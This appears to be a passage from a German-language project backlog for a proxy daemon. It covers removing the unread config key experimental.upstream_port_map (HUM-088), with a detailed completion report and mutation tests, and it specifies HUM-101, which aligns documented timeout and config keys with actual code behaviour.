`experimental.upstream_port_map` verschwindet aus Modell, Prüfung, Schema, Fixture, `docs/CONFIG.md` und aus allen Stellen in `backlog/` und `tests/`, die ihn als Test-Hebel nennen. Danach ist eine `config.toml` mit dem Schlüssel ein harter `CONFIG_002` mit dem Schlüsselnamen in der Meldung, und `docs/CONFIG.md` behauptet nichts mehr, was der Proxy nicht tut. `backlog/CONVENTIONS.md` 4.22 hält die Entscheidung samt Grund fest, damit sie nicht als Versehen gelesen wird.

### Nicht-Ziel
Kein Einbau der Portumlenkung in den Proxy; der Bauplan dafür steht unten in Spezifikation B und wird nur ausgeführt, wenn seine Bedingung eintritt. Keine Änderung an `ip_is_private` oder `allow_private`. Kein `upstream_override` (`backlog/sprint-3.md:1492` und `:1504`, `#[cfg(feature = "test-hooks")]` aus HUM-046) — ein anderer Hebel, der ebenfalls noch nicht existiert. Nicht behandelt wird die zweite Hälfte des Fallstricks aus `backlog/sprint-2.md:1690`: Auch für `resolver.overrides` warnt der Daemon beim Start nicht; das bleibt offen und gehört in ein eigenes Issue. `resolver.test_ca` bleibt, wie es ist (Warnung vorhanden, Leser fehlt, HUM-024).

### Betroffene Pfade
- `daemon/crates/config/src/model.rs:452` (Feld entfernen), `src/validate.rs:348-357` und `:386` (Prüffunktion und Aufruf entfernen), `src/schema.rs:338` (Testerwartung auf `resolver.overrides` umstellen)
- `daemon/crates/config/tests/schema.rs:189`, `tests/precedence.rs:333-336`
- `daemon/crates/config/tests/fixtures/config.schema.json` (erzeugt, zwei Stellen bei Zeile 65 und 77)
- `docs/CONFIG.md:80` (erzeugt)
- `backlog/CONVENTIONS.md:334`, `:390`, Abschnitt 4.22 (Zeile 1284)
- `backlog/RECONCILE.md:34`
- `backlog/sprint-2.md:414`, `:439` (HUM-024), `:1631`, `:1690` (HUM-036)
- `backlog/sprint-3.md:1733` (HUM-076, Test `detects_ollama_mock`)
- `tests/e2e/m2_first_decision/run.sh:80` (Kommentar)

### Spezifikation

**A. Entfernung (dieses Issue).**

`Experimental` behält `h2_upstream` und `ws_hold` und verliert `upstream_port_map`. `experimental_is_well_formed` hat danach nichts mehr zu prüfen und entfällt mitsamt dem Aufruf in `validate.rs:386`; `Experimental` als Import in `validate.rs` fällt mit weg, `BTreeMap` in `model.rs` bleibt (`resolver.overrides`, `sandbox.env`). Schema, Fixture und `docs/CONFIG.md` sind erzeugte Artefakte: `free_table_paths()` (`src/schema.rs:128`) leitet sich aus dem Schema ab und braucht keine Änderung, nur seine Testerwartung; die Fixture entsteht neu über den Fixture-Test, `docs/CONFIG.md` über `UPDATE_CONFIG_DOCS=1 cargo test -p humanitl-config --test config_docs`. Von Hand editiert driften beide.

`precedence.rs` prüft mit dem Schlüssel die Regel aus CONVENTIONS 4.11 („Freiform-Tabellen sind im Merge ein Blatt: eine höhere Ebene ersetzt die ganze Tabelle"). Diese Regel behält ihren Test, der Fall wandert auf die einzige verbleibende Freiform-Tabelle `resolver.overrides`, mit `lower = { "a.test" = "10.0.0.1" }` und `higher = { "b.test" = "10.0.0.2" }`.

Prosa-Stellen, wörtlich zu korrigieren, nicht zu streichen:

- `backlog/CONVENTIONS.md` 4.22, Satz ab Zeile 1284: aus „Ausserdem liest den Schlüssel `experimental.upstream_port_map` heute niemand" wird die Feststellung, dass der Schlüssel nie einen Leser hatte und mit HUM-088 entfernt wurde, samt Grund (`ip_is_private` hätte die gedachten Aufbauten ohnehin abgewiesen).
- `backlog/CONVENTIONS.md:334` (Liste 4.4) und `:390` (Freiform-Tabellen): Eintrag streichen beziehungsweise auf `resolver.overrides` reduzieren.
- `backlog/sprint-2.md:1631`: die Zeile `[experimental] upstream_port_map = { "443" = 8443 }` aus dem `config.toml` des Demoskripts entfernen; `:1690` nennt danach nur noch `resolver.overrides` als Test-Hebel. `:414` und `:439` (HUM-024) verlieren den Schlüssel aus Schlüsselliste und Test `pinned_addr_used`; was dort wirklich läuft, steht in `daemon/crates/proxy/tests/dns_after_allow.rs:274`.
- `backlog/sprint-3.md:1733`: `detects_ollama_mock` bindet den Mock auf einem flüchtigen Port und bekommt ihn übergeben, statt den Schlüssel zu nennen.
- `tests/e2e/m2_first_decision/run.sh:80`: Der Kommentar begründet die eigenen Ports weiter mit dem Netz-Namensraum, ohne einen Schlüssel zu nennen, der es nicht mehr gibt. `M2_EXPECTED_ASSERTIONS` bleibt 47.
- `backlog/RECONCILE.md:34` ist ein Protokolleintrag von 2026-09-02 und wird nicht umgeschrieben; er bekommt den Verweis auf dieses Issue in Klammern.

**B. Einbau (nicht dieses Issue, Bedingung und Bauplan).**

Bedingung: Ein ausgelieferter Test braucht die Umlenkung und lässt sich ohne sie nicht schreiben. Tritt sie ein, gilt: `Direct::new` (`daemon/crates/proxy/src/egress/direct.rs:26`) nimmt die Tabelle entgegen und bildet den Port in Zeile 52 ab, bevor `SocketAddr::new` ihn benutzt; die beiden Aufrufstellen `daemon/bin/humanitld/src/main.rs:512` und `daemon/crates/ipc/src/server.rs:1103` haben beide `&Config` zur Hand; `ProxyBuilder` (`daemon/crates/proxy/tests/support/mod.rs:368`) reicht sie durch; neben `main.rs:488` kommt die von `backlog/sprint-2.md:1690` verlangte Startwarnung dazu. Die Host-Kopfzeile aus `daemon/crates/proxy/src/upstream.rs:348` bleibt beim Originalport — das ist Absicht, weil sie zum Namen im Zertifikat gehört, und gehört als Satz in den Doc-Kommentar der Tabelle. Abnahme dieser Variante: Ein Lauf mit `{ "443" = 8443 }` gegen ein Ziel, das auf 8443 lauscht, antwortet 200; derselbe Lauf ohne den Schlüssel endet mit 502 und `PROXY_003`.

### Schritte
1. Feld, Prüffunktion und Aufruf entfernen; `cargo test -p humanitl-config` zeigt die Testerwartungen, die nachziehen müssen.
2. `schema.rs:338` und `tests/schema.rs:189` anpassen, `precedence.rs`-Fall auf `resolver.overrides` umstellen.
3. Fixture und `docs/CONFIG.md` neu erzeugen, Diff ansehen: nur die Blöcke des Schlüssels dürfen fehlen.
4. Prosa-Stellen aus Spezifikation A korrigieren, CONVENTIONS 4.22 mit Grund fortschreiben.
5. `tests/e2e/m2_first_decision/run.sh` einmal ganz fahren.
6. `make check`, danach `tools/verify-commit.sh` gegen den Commit.

### Tests
- `humanitl-config` Schema-Test: `known_paths()` und `leaf_paths()` enthalten `experimental.upstream_port_map` nicht mehr.
- `schema::tests::free_tables_are_leaves`: prüft `resolver.overrides`, nicht mehr den entfernten Schlüssel.
- `precedence`-Fall für Freiform-Tabellen auf `resolver.overrides`: untere Ebene `{ "a.test" = "10.0.0.1" }`, obere `{ "b.test" = "10.0.0.2" }`, Ergebnis ist die obere Tabelle allein.
- Neuer Fall in den Config-Tests: eine `config.toml` mit `[experimental] upstream_port_map = { "443" = 8443 }` lädt und liefert `CONFIG_005` mit `Severity::Warning`, dem Schlüsselnamen und HUM-088 im Text; der Wert erreicht die Konfiguration nicht.
- Fixture-Test und `config_docs`-Test grün ohne erneutes Setzen von `UPDATE_CONFIG_DOCS`.
- `tests/e2e/m2_first_decision/run.sh` unverändert grün.

- [x] Kein **Leser**: `grep -rn "upstream_port_map" --include="*.rs" daemon/ | grep -v "/target/"` trifft nur `alias::RETIRED` und erklärende Kommentare, keinen Zugriff auf einen Wert. **Berichtigt (2026-09-06):** Der ursprüngliche Wortlaut verlangte null Treffer und widersprach damit Kriterium 3, das den Eintrag in `RETIRED` verlangt.
- [x] Keine **Zusage**: in `docs/` steht der Schlüssel nur noch in der Tabelle der entfallenen Schlüssel und in der Begründung von `docs/SECURITY.md`; `tests/` und `app/` treffen nicht. **Berichtigt (2026-09-06):** derselbe Widerspruch wie oben — die Tabelle entsteht aus `RETIRED`.
- [x] Ein Start mit einer `config.toml`, die `[experimental] upstream_port_map = { "443" = 8443 }` enthält, läuft weiter und meldet `CONFIG_005` als Warnung mit Schlüssel, Issue und Grund; der Pfad steht dafür in `alias::RETIRED` (`backlog/CONVENTIONS.md` 4.25, entschieden in HUM-101). **Gemessen an der Binärdatei (2026-09-06):** `CONFIG_005`, voller Hochlauf, SIGTERM endet mit 0 und räumt ab.
- [x] `cargo test -p humanitl-config` grün, inklusive Fixture- und `config_docs`-Test ohne Neuschreiben der erzeugten Dateien. **Gemessen (2026-09-06):** 167 Tests über acht Binärdateien, null Fehlschläge.
- [x] `git diff -- daemon/crates/config/tests/fixtures/config.schema.json` zeigt ausschließlich Entfernungen (0 hinzugefügt, 15 entfernt). **Berichtigt (2026-09-06):** Für `docs/CONFIG.md` gilt das nicht mehr — dort kam die Spalte „Form“ samt Erklärung hinzu, ohne die die Unterscheidung zwischen entfallenem Wert und entfallener Tabelle nirgends stünde.
- [x] `tests/e2e/m2_first_decision/run.sh` Exit 0, `M2_EXPECTED_ASSERTIONS` unverändert. **Berichtigt (2026-09-06):** die Zahl steht seit HUM-087 auf 69, nicht auf 47; gemessen 69.
- [x] `backlog/CONVENTIONS.md` 4.22 nennt HUM-088, den Entfernungsgrund und die Bedingung, unter der der Schlüssel zurückkäme. **Gemessen (2026-09-06):** drei Nennungen in 4.22, dazu der neue vierte Punkt in 4.25.
- [x] `make check` grün und `tools/verify-commit.sh` grün gegen den Commit, nicht gegen den Arbeitsbaum. **Gemessen (2026-09-06):** grün über alle acht Schritte gegen den Merge-Commit.

### Fallstricke
- `precedence.rs` verliert ohne Ersatz den einzigen Test für die Regel aus CONVENTIONS 4.11; `resolver.overrides` ist die letzte Freiform-Tabelle und muss den Fall übernehmen, sonst ist die Regel unbelegt.
- Entfernen ist ein Bruch für bestehende Dateien. Seit HUM-101 wird er abgefedert: Der Pfad kommt in `alias::RETIRED`, das Laden warnt mit `CONFIG_005` und startet weiter (CONVENTIONS 4.25). Ohne diesen Eintrag wäre der Schlüssel ein harter `CONFIG_002`, und ein Update ließe den Daemon nicht mehr starten. Der Grund für die Entfernung selbst gehört weiterhin in CONVENTIONS 4.22, damit ein Fehlerbericht dazu sofort einzuordnen ist.
- `daemon/crates/config/tests/fixtures/config.schema.json` und `docs/CONFIG.md` werden erzeugt. Von Hand geändert driften sie gegen `model.rs`, und der Fixture-Test wird erst im nächsten Lauf rot.
- HUM-039 nennt den Schlüssel nicht; wer in dessen Nähe sucht, findet `upstream_override` (`backlog/sprint-3.md:1492` und `:1504`) und verwechselt zwei verschiedene, beide nicht existierende Hebel.
- Beim Einbau nach Variante B: `Direct::new` ist heute `const fn` und verliert das mit einem `BTreeMap`-Parameter; `impl Default for Direct` zieht mit.
- Beim Einbau nach Variante B: `daemon/crates/proxy/src/upstream.rs:348` baut die Host-Kopfzeile aus `request.authority.port`. Wird sie mit abgebildet, passt der Name nicht mehr zum Zertifikat, und der Test misst das Falsche.

### Referenzen
`backlog/CONVENTIONS.md` 4.4, 4.11, 4.13, 4.22; BACKLOG.md ADR-006; `docs/CONFIG.md`; HUM-024 (`backlog/sprint-2.md:371`), HUM-036 (`backlog/sprint-2.md:1605`), HUM-076 (`backlog/sprint-3.md:1702`).

### Stand (2026-09-06): entfernt nach Variante A, und die Streichung war mehr Arbeit als die Spezifikation annahm

**Die Entscheidung ist nachgeprüft und nicht bloß übernommen worden.** Die
Spezifikation nennt die Streichung als Ziel. Eine Streichung nimmt trotzdem
etwas weg, und ein Ziel ist kein Beweis; deshalb stehen die drei Fragen hier
mitsamt ihren Antworten:

1. *Braucht ein Testaufbau die Umlenkung?* Nein. Zwei Wege sind gebaut und in
   Gebrauch: Die Rust-Tests des Proxys setzen den flüchtigen Port direkt in die
   Authority (`pinned_addr_used`, `daemon/crates/proxy/tests/dns_after_allow.rs`),
   und der M2-Lauf bindet in seinem eigenen Netz-Namensraum die echten Ports 80
   und 443. Der Lauf ist seit HUM-087 auf `https` umgestellt, prüft 69
   Behauptungen und bedient 17 Anfragen, 16 davon über TLS — und er kommt an
   keiner Stelle in die Nähe des Schlüssels. Der Kommentar in
   `tests/e2e/m2_first_decision/run.sh`, der ihn als ungenutzt erwähnte, nennt
   ihn jetzt gar nicht mehr.
2. *Hätte er die Aufbauten gerettet, für die er gedacht war?* Nein.
   `ip_is_private` weist `127.0.0.1` unabhängig vom Port ab, solange die Regel
   nicht `allow_private` setzt. Der Port war nie das Hindernis.
3. *Trägt das Argument von HUM-087, das denselben Schnitt anders entschied?*
   Nein, und der Unterschied ist der Kern. `resolver.test_ca` hatte einen
   ausgelieferten Lauf, der ohne den Schlüssel das Falsche maß, und keinen
   zweiten Weg; deshalb wurde er verdrahtet, aber hinter einem Flag der
   Kommandozeile. Der Portschlüssel hat keinen wartenden Lauf und zwei zweite
   Wege. Ein Hebel, der beeinflusst, wohin der Proxy seine eigene Verbindung
   öffnet, bekommt keinen Leser auf Vorrat — und ein Flag zu bauen, hinter dem
   niemand steht, wäre dieselbe unbelegte Zusage in kleinerer Schrift. Der
   Absatz steht in `docs/SECURITY.md` 5 neben dem der Testwurzel, damit die
   beiden Entscheidungen nebeneinander lesbar sind, und in
   `backlog/CONVENTIONS.md` 4.22 mit der Bedingung für die Rückkehr.

**Die Spezifikation übersieht die eigentliche Arbeit: `flatten`.** Der Wert des
Schlüssels ist eine Tabelle. Solange er im Schema stand, war er eine *freie
Tabelle*, und `flatten` (`daemon/crates/config/src/load.rs`) ließ ihn deshalb
ganz. Nimmt man ihn aus dem Schema, ist er keine mehr: Das Laden zerlegt
`upstream_port_map = { "443" = 8443 }` in den Pfad
`experimental.upstream_port_map.443`, `alias::retired` kennt genau diesen Pfad
nicht — verglichen wird der ganze Pfad, nicht sein Anfang (HUM-101 hat das
ausdrücklich so entschieden) — und aus der zugesagten Warnung wird der harte
`CONFIG_002`, der den Daemon nicht mehr starten lässt. Genau das verbietet
Akzeptanzkriterium 3. `flatten` lässt eine Tabelle jetzt auch dann ganz, wenn
ihr Pfad in `alias::RETIRED` steht; ein entfallener Schlüssel bleibt ein
Eintrag, so wie er einer war, als es ihn noch gab. Das ist neben der Streichung
selbst und dem Eintrag in `alias::RETIRED` die einzige Änderung an
Produktionscode, und es ist der Grund, warum `limits.idle_timeout_secs` aus
HUM-101 den Fall nicht schon abgedeckt hatte: Sein Wert war eine Zahl.

**Und der Pfad allein reicht auch dafür nicht — die Form gehört dazu (aus dem
Review, blockierender Befund von Codex).** Die erste Fassung des Riegels sah nur
den Pfad an und nahm damit jede Untertabelle eines entfallenen Schlüssels mit.
Für `experimental.upstream_port_map` ist das richtig: Es war eine freie Tabelle,
`upstream_port_map.extra` war ein Eintrag darin und kein Pfad des Schemas, und
eine Warnung genügt. Für `limits.idle_timeout_secs` ist es falsch: Das war eine
Zahl, unter der es nie eine Ebene gab, und `[limits.idle_timeout_secs.deeper]`
ist keine gestern gültige Datei, sondern eine Struktur, die das Schema nie
kannte — sie wurde stillschweigend zur Warnung, und ein Tippfehler hinter einem
entfallenen Namen wäre damit erlaubt gewesen. `alias::RETIRED` führt deshalb
neben Pfad, Issue und Grund die Form mit (`alias::RetiredShape`: `Scalar` oder
`FreeTable`), und der Riegel gilt nur der Tabellenform. Kurz, und so steht es in
`backlog/CONVENTIONS.md` 4.25: **Was unter einem entfallenen Skalar steht, hat
es nie gegeben und scheitert; was unter einer entfallenen Tabelle stand, gehörte
ihr und wird mit ihr verworfen.** Der Geschwister-Tippfehler
(`experimental.upstream_port_map_typo`) war davon nie betroffen — er trifft den
Pfad nicht und scheitert seit jeher hart.

Die Form steht auch auf der erzeugten Seite: `docs/CONFIG.md` führt die
entfallenen Schlüssel jetzt mit einer Spalte „Form" und einem Absatz darüber,
was mit dem geschieht, was unter einem solchen Schlüssel steht. Ohne sie sagte
das Dokument dasselbe für beide Fälle, und der Unterschied zwischen einem
weiterlaufenden und einem nicht mehr startenden Daemon stünde nur im Quelltext.

**Drei weitere Stellen, an denen die Spezifikation nicht stimmt.**

- **Die Akzeptanzkriterien 1 und 2 widersprechen Kriterium 3.** „`grep -rn
  "upstream_port_map" --include="*.rs" daemon/` liefert keine Zeile" und der
  Eintrag in `alias::RETIRED` schließen einander aus: `RETIRED` steht in
  `daemon/crates/config/src/alias.rs`, und der Pfad muss dort wörtlich stehen.
  Dasselbe gilt für `docs/`: Die Tabelle „Entfallene Schlüssel" in
  `docs/CONFIG.md` wird aus `RETIRED` erzeugt und nennt ihn. HUM-101 hatte
  denselben Widerspruch und hat ihn genauso aufgelöst; die beiden Greps sind
  aus der ersten Fassung des Issues stehengeblieben, die die Milde für
  entfallene Schlüssel noch nicht kannte. Erfüllt ist, was sie meinen: kein
  Leser, kein Feld, kein Schema-Eintrag, keine Zusage in der Dokumentation.
- **Der Fallstrick „`precedence.rs` verliert ohne Ersatz den einzigen Test für
  die Regel aus CONVENTIONS 4.11" trifft nicht zu.** Die Regel hat einen
  eigenen Test, `a_free_table_is_replaced_as_a_whole`, und der prüft sie an
  `resolver.overrides` seit HUM-062. Die Zeile in `GROUP_OVERRIDES` prüft etwas
  anderes: dass jede Gruppe des Schemas einen Präzedenz-Test hat
  (`the_override_table_names_every_group_of_the_schema` erzwingt genau eine
  Zeile je Gruppe). Verschöbe man sie wie vorgeschlagen auf
  `resolver.overrides`, hätte `resolver` zwei Zeilen und `experimental` keine,
  und dieser Test würde rot. Die Zeile bleibt deshalb bei `experimental` und
  zeigt jetzt auf `experimental.h2_upstream`.
- **`M2_EXPECTED_ASSERTIONS` ist 69, nicht 47.** HUM-087 hat die Zahl am selben
  Tag angehoben. Sie ist unverändert geblieben, und der Lauf ist grün.

**Der Start ist gemessen, nicht nur der Ladevorgang.** Ein `humanitld` mit einer
`config.toml`, die nur `[experimental] upstream_port_map = { "443" = 8443 }`
enthält, schreibt als erste Zeile

```json
{"level":"WARN","fields":{"message":"configuration","code":"CONFIG_005","why":"experimental.upstream_port_map (from config.toml) was removed with HUM-088: … The value is ignored; delete the line."}}
```

und fährt danach vollständig hoch: Aufzeichnung offen, CA bereit, Regeln
geladen, `proxy.sock` und `daemon.sock` da. `SIGTERM` räumt beides wieder ab.
Das ist Akzeptanzkriterium 3, an der Binärdatei geprüft und nicht am
Ladevorgang allein.

**Zwölf Mutationsproben, alle rot.** Angewandt in einer Kopie des Baums
außerhalb des Repositories, je eine Zeile Produktionscode, danach
zurückgenommen und die Rücknahme mit `cmp` nachgeprüft:

| Mutation | Datei | Ergebnis |
|---|---|---|
| `stays_whole` verliert den Riegel für entfallene Pfade | `load.rs` | `the_retired_port_map_warns_and_stays_one_entry` rot |
| `continue` wird `break`, nachdem der entfallene Schlüssel gemeldet ist | `load.rs` | derselbe Test und `a_retired_key_warns_and_lets_the_daemon_start` rot |
| `retired` vergleicht mit `starts_with` statt mit `==` | `alias.rs` | `retired_paths_are_sorted_unique_and_gone_from_the_schema` rot |
| Das Feld steht wieder in `Experimental` | `model.rs` | fünf Tests in `config_readers` rot, darunter `the_removed_port_map_is_gone_from_the_schema` |
| Die Warnung nennt das Issue nicht mehr | `load.rs` | beide Tests der entfallenen Schlüssel rot |
| Beide ersten Mutationen zugleich (der naheliegende „Reparaturversuch": zerlegen und dafür den Anfang vergleichen) | `load.rs`, `alias.rs` | rot mit zwei Warnungen auf `…port_map.443` und `…port_map.80` statt einer auf dem Pfad |
| Der Befund bekommt eine `FixAction` auf einen fremden Schlüssel | `load.rs` | rot an der Zusicherung aus CONVENTIONS 4.25 |
| Die Milde gilt jeder Ebene außer dem Projekt-Profil | `load.rs` | `a_project_that_brings_the_retired_port_map_gets_nothing` rot, `CONFIG_002` statt der Warnung |
| `stays_whole` ignoriert die Form und sieht wieder nur den Pfad | `load.rs` | `a_table_under_a_retired_scalar_still_fails_hard` rot — der blockierende Befund selbst |
| Die freie Tabelle steht als `Scalar` in `RETIRED` | `alias.rs` | vier Tests rot, darunter `a_table_under_the_retired_port_map_is_swallowed_with_it` |
| Die Milde gilt nur der globalen Datei | `load.rs` | `the_retired_port_map_warns_on_every_layer_it_can_come_from` und der Projekt-Profil-Test rot |
| Die Form der Tabelle steht falsch in `RETIRED` (Blick auf die erzeugte Seite) | `alias.rs` | `every_retired_key_is_listed_with_its_issue` und `docs_in_sync` rot |

Keine Mutation hat überlebt. Die Zeile in `GROUP_OVERRIDES` ist dabei keine neue
Behauptung, sondern eine verschobene; was ihre Existenz erzwingt, ist
`the_override_table_names_every_group_of_the_schema`, und das ist Testdaten und
kein Produktionscode.

**Eine Verhaltensänderung, die die Spezifikation nicht nennt: das
Projekt-Profil.** Der Schlüssel war `x-project-scope = "denied"`, ein
Projekt-Profil, das ihn setzte, scheiterte deshalb mit einem harten
`CONFIG_003`. Jetzt bekommt es dieselbe Warnung wie jede andere Ebene, weil das
Laden entfallene Pfade übergeht, bevor es die Sperre prüft (so gebaut in
HUM-101). Der Wert erreicht die Konfiguration in beiden Fällen nicht; verschoben
hat sich nur, ob der Daemon dabei stehenbleibt. Ein Wert, der nirgends ankommt,
verschiebt keine Vertrauensgrenze — `a_project_that_brings_the_retired_port_map_gets_nothing`
hält beide Hälften fest, und die achte Mutation zeigt, was der andere Weg wäre.
Geprüft wird das für alle fünf Ebenen, aus denen der Schlüssel kommen kann:
globale Datei, globales Profil, Projekt-Profil, Umgebung und Kommandozeile.
`the_retired_port_map_warns_on_every_layer_it_can_come_from` fährt sie der Reihe
nach und verlangt je Ebene genau eine Warnung, die den Pfad, das Issue und die
Ebene nennt, und eine Konfiguration, die dem Vorgabewert gleicht. Der Bericht
hat das anfangs behauptet, ohne dass ein Test es hielt; das war der zweite
Befund aus dem Review, den ich übernommen habe.

**Erwogen, aber nicht gebaut.** Die von `backlog/sprint-2.md:1690` verlangte
Startwarnung für `resolver.overrides` fehlt weiterhin; sie war schon vorher
Nicht-Ziel dieses Issues und braucht ein eigenes. Für den Portschlüssel
erübrigt sie sich, weil es ihn nicht mehr gibt.


## HUM-101 · Konfigurationsschlüssel ohne Leser
Sprint: 3 · Größe: L · Abhängigkeiten: HUM-062, HUM-063 · Blockiert: —

### Kontext
`docs/CONFIG.md` wird aus dem Schema erzeugt (`daemon/crates/config/tests/config_docs.rs`) und ist deshalb nie veraltet, was die **Existenz** eines Schlüssels angeht. Über seine **Wirkung** sagt der Generator nichts. Mindestens sieben Schlüssel stehen damit heute mit einer Zusage im Dokument, die der Code nicht einlöst:

- `limits.idle_timeout_secs` (Vorgabe 90) und `limits.body_timeout_secs` (Vorgabe 300). Beide werden nur in `validate.rs:211-212` auf ihren Bereich geprüft und danach von niemandem gelesen. `docs/CONFIG.md:120` und `:127` sagen zu, dass sie Verbindungen beenden.
- `experimental.upstream_port_map` — das ist HUM-088 und wird dort entfernt.
- `experimental.ws_hold` — Treffer nur unter `#[cfg(test)]` (`humanitl/src/cli.rs:644`).
- `ui.sound` und `ui.notifications` — im Rust-Teil kein Treffer, und der Leser in Dart ist festverdrahtet: `app/lib/features/tray/providers/attention.dart:70` lautet `bool notificationsEnabled(Ref ref) => true;`, der Kommentar darüber räumt die fehlende Verdrahtung ein.
- `pseudonyms.max_response_bytes` und `pseudonyms.translate_responses` gehören zu HUM-079 aus Sprint 4 und haben zu Recht noch keinen Leser — aber das Dokument sagt es nicht, sondern beschreibt sie in derselben Gegenwartsform wie jeden wirksamen Schlüssel.

Bei den beiden `limits`-Schlüsseln wiegt es schwerer als bei `resolver.test_ca` (HUM-087), weil sie Ressourcengrenzen zusagen, die es nicht gibt.

### Was der Review dieses Issues ergeben hat, und was daraus folgt
Die erste Fassung wollte beide Zeitgrenzen einbauen und dabei das Halten ausnehmen. Der Review hat gezeigt, dass das so nicht baubar ist, und die Fassung ist daran angepasst:

Der Hold sitzt **in** der Service-Future innerhalb `serve_connection` (`handler.rs:1193-1211`). Während er läuft, fließen auf der Verbindung des Agenten null Bytes. Eine Leerlaufuhr auf dieser Verbindung feuert also genau dann, wenn sie nicht darf — und mit den Vorgaben 90 Sekunden Leerlauf gegen 300 Sekunden Haltefrist würde die Standardkonfiguration **jeden** Hold nach 90 Sekunden töten. `hyper` bietet dafür keinen Aufhänger; die einzige Stelle wäre ein Wrapper um den Socket in `core.rs:134-141`, vor `serve_connection`, mit einem Zähler gehaltener Flüsse, der die Uhr anhält. Das ist kein Beiwerk, sondern der eigentliche Aufwand des Issues, und es ist der Grund für die Größe L.

Zweitens beschreiben `idle_timeout_secs` und `header_timeout_secs` auf einer Keep-Alive-Verbindung dieselbe Spanne — der Doc-Kommentar in `handler.rs:86-88` sagt selbst, die Kopf-Frist sei „zugleich die Frist bis zur nächsten Anfrage". Zwei Schlüssel für eine Uhr sind eine Zusage zu viel. **Erste zu treffende Entscheidung dieses Issues:** entweder speist `idle_timeout_secs` die vorhandene `header_read_timeout` und `header_timeout_secs` verschwindet, oder umgekehrt. Ein dritter Weg ist, `idle_timeout_secs` nach dem Muster von HUM-088 ganz zu entfernen; das ist der ehrlichste, wenn sich keine Spanne findet, die er allein beschreibt.

Drittens ist beim Ziel nur der gestreamte Antwort-Body unbegrenzt (`body.rs:102-120`); bis zu den Antwort-Kopfzeilen deckt `handshake_timeout` bereits alles ab (`upstream.rs:267,287,301`), gespeist aus `header_timeout_secs`. Die Rumpfgrenze gehört also genau dorthin und nirgends sonst — drei Uhren auf einer Verbindung ergeben einen Abbruch, dessen Grund niemand nennen kann.

Viertens: `reason: idle_timeout` im Blockbanner ist unlieferbar. Im Leerlauf ist keine Anfrage in Flug, also gibt es keine Antwort, in die ein Banner passt (`core-types/src/block.rs:162-163`). Der Leerlauf schließt still und meldet sich im Ereignisstrom und im Protokoll. Nur die Rumpfgrenze auf der Client-Seite hat eine Anfrage in Flug und kann ein Banner tragen; auf der Ziel-Seite trüge die Zeile ohnehin das Präfix `upstream_` (`flow.rs:184`).

Fünftens speist `limits.*` auch den IPC-Stapel (`ipc/src/server.rs:1107-1112`). Eine symmetrische Verdrahtung dorthin würde den Ereignisstrom der Oberfläche abschneiden, der minutenlang stumm sein darf. Der IPC-Stapel bleibt ausgenommen.

### Ziel
Die Zusagen im Dokument und das Verhalten stimmen wieder überein — durch Einbau, wo eine Grenze sinnvoll ist, und durch Streichung, wo sie es nicht ist. Jeder Schlüssel im Schema trägt entweder einen Leser oder die Angabe, ab welchem Issue er wirkt; `docs/CONFIG.md` schreibt diese Angabe mit, und ein Test verhindert, dass ein achter Fall entsteht.

### Nicht-Ziel
Keine Umsetzung von HUM-079 und keine Entfernung von `experimental.upstream_port_map` (HUM-088). Keine Verdrahtung von `ui.sound` und `ui.notifications` — sie bekommen die Angabe und ihr eigenes Issue.

### Betroffene Pfade
- `daemon/crates/config/src/model.rs`: `#[schemars(extend(...))]` mit einem neuen Schlüssel `x-pending-issue`, nach dem Vorbild von `x-tier` (`model.rs:141-174`)
- `daemon/crates/config/src/schema.rs`: die Angabe wird über `leaf_paths()` erreichbar
- `daemon/crates/config/tests/config_readers.rs` (neu): das Register und sein Test
- `daemon/crates/config/tests/config_docs.rs`: der Generator schreibt die Angabe in die Tabelle
- `daemon/crates/proxy/src/core.rs`: der Wrapper um den Socket samt Zähler
- `daemon/crates/proxy/src/connect.rs`: der Zähler im `ConnectionContext`, den `tunnel` mitklont
- `daemon/crates/proxy/src/body.rs`: die Rumpfgrenze am gestreamten Antwort-Body
- `proto/humanitl/v1/humanitl.proto`, `daemon/crates/ipc/src/convert.rs`, `app/lib/core/domain/flow_state.dart`: falls ein neuer `reason` entsteht
- `docs/CONFIG.md` aus dem Generatorlauf

### Spezifikation
**Das Register statt einer Heuristik.** Die erste Fassung wollte ein Shell-Gate, das über den Feldnamen nach einem Leser sucht. Der Review hat es durchgezählt: `env` trifft 244-mal, `profile` 464-mal, `command` 293-mal; `timeout_secs` ist Teilzeichenkette von vier verschiedenen Schlüsseln; `enabled` ist zweimal vergeben (`findings.enabled`, `recorder.enabled`) und über den Namen nicht zu trennen; ein Doc-Kommentar zählt als Treffer; und `humanitl config get` liest generisch über serde jeden Schlüssel, sodass formal keiner leserlos ist. Die Heuristik findet also weder zuverlässig noch trennt sie „wirkt" von „wird serialisiert".

Stattdessen ein Register im Repository, eine Zeile je Schema-Pfad, mit genau einer Einstufung: `effective` oder `pending(HUM-xxx)`. Ein Test in `daemon/crates/config/tests/` liest `schema::leaf_paths()` und das Register und wird rot, sobald das Schema einen Pfad kennt, den das Register nicht kennt, oder umgekehrt. Das ist dasselbe Muster wie beim Diagnostik-Register, es braucht keinen neuen Schritt in `make check`, und es muss das Schema nicht aus einer Shell heraus parsen — was ohnehin nicht ginge.

Die Einstufung `effective` ist eine Behauptung eines Menschen, keine Messung. Das ist Absicht: das Register soll den **vergessenen** Schlüssel finden, und ein Mensch, der beim Anlegen eines Schlüssels „wirkt" schreibt, ohne ihn zu verdrahten, hat bewusst gelogen statt es zu übersehen.

**Die Zeitgrenzen.** Die Rumpfgrenze begrenzt die Zeit, in der ein Rumpf vollständig angekommen sein muss, und sitzt für die Ziel-Richtung am gestreamten Antwort-Body. Die Leerlaufgrenze — sofern die erste Entscheidung sie behält — sitzt im Wrapper vor `serve_connection` und ruht, solange die Verbindung einen gehaltenen Fluss trägt. Sie ruht auch für die Durchreiche zum Sprachmodell: ein lokales Modell schweigt vor dem ersten Token regelmäßig länger als 90 Sekunden, und dieser Seitenkanal ist ausdrücklich erklärt.

### Tests
- Paar-Test der Rumpfgrenze: ein Antwort-Body, der zu langsam kommt, wird abgebrochen; mit hoher Grenze nicht. Zeit über eine einspeisbare Uhr, nie über die Wanduhr.
- Ein Test, dass eine gehaltene Anfrage die Leerlaufgrenze überlebt, auch wenn sie länger wartet — und ein zweiter, dass eine Verbindung **ohne** gehaltenen Fluss sie nicht überlebt. Ohne den zweiten prüft der erste nichts.
- Ein Test, dass eine Durchreiche zum Sprachmodell mit langer Stille nicht abgebrochen wird.
- Register-Probe: einen Schlüssel im Schema hinzufügen, ohne Zeile im Register — der Test wird rot und nennt den Pfad.
